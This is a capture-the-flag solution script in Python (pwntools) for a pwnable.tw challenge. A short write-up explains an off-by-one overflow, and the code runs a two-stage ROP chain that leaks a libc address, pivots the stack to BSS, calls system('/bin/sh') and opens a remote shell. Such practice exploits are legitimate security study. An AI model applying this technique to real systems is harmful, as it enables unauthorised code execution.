from pwn import *


conn = None
HOST = "chall.pwnable.tw"
PORT = 10103

"""
The vulnerability for this challenge was a simple buffer overflow caused by
improper checks to limit the length of user input. By creating a bullet of
power 47, you satisfy the condition that your power is less than 48, this
means you can use the power up menu option. By doing this, you take up the
48th letter with 1 byte. The problem is, the devs for this program forgot that
read will insert a NULL byte at the end of a string, effectively zeroing out
the power variable which is an int next to the bullet description buffer.
This puts is in a position where our buffer is full, yet our score is 1
(because it incremented from that single byte power up from last time). So
the condition for power up is still there (power < 48). So we do so and thus
it allows us to perform a buffer overflow attack.

From there, it's all about creating the right ROP chain. I didn't know how to
do this at the start, so I looked around for hints. I realized my original
strategy of leaking a GOT entry via ROP is the best option, it's just that I
didn't order my ROP chain correctly. Also I didn't think about using the BSS
section as a temporary stack, which was a problem before because I couldn't
ret before a leave, and usually a buffer overflow corrupts the EBP register.
Now I can just give a BSS address and it will begin using that as the new
heap!

Once you leak the puts address, you need to exploit the thing one more time
to call system. Then voila!!
"""


def create_bullet(description):
    conn.sendafter("Your choice :", '1')
    conn.sendafter(':', description)


def power_up(description):
    conn.sendafter("Your choice :", '2')
    conn.sendafter(':', description)


def beat():
    conn.sendafter("Your choice :", '3')


def main():
    global conn
    conn = remote(HOST, PORT)

    bss_ptr = 0x0804B020
    puts_ptr = 0
    system_ptr = lambda: puts_ptr - 149504
    binsh_ptr = lambda: puts_ptr + 1023307

    ropA = p32(0x080484A8)  # puts@PLT (Calling puts)
    ropA += p32(0x08048a7a)  # pop, pop, ret
    ropA += p32(0x0804AFDC)  # puts@GOT
    ropA += p32(bss_ptr)  # BSS ptr (EBP).
    ropA += p32(0x08048954)  # main

    # Callinng puts to print out the GOT entry for puts.
    log.info("Exploiting for puts address...")
    create_bullet('A'*47)
    power_up('A')  # Triggering a buffer overflow.
    power_up('\xff'*3 + p32(bss_ptr) + ropA)  # Smashing the stack.
    beat()  # Begin following the ROP chain.
    conn.recvlines(6)  # Getting rid of a lot of crap.
    puts_ptr = u32(conn.recv(4))  # Getting the leaked puts address.
    log.info("Puts @ %s." % hex(puts_ptr))

    ropB = p32(system_ptr())  # Calling system.
    ropB += p32(0xdeadbeef)  # Some padding.
    ropB += p32(binsh_ptr())  # /bin/sh

    log.info("Exploiting for system...")
    create_bullet('A'*47)  # Exploiting again, for system this time.
    power_up('A')
    power_up('\xff'*3 + p32(bss_ptr) + ropB)
    beat()  # Follow ROP chain.

    conn.clean(1)  # Getting rid of crap.
    conn.interactive()  # Shellz...


if __name__ == "__main__":
    main()

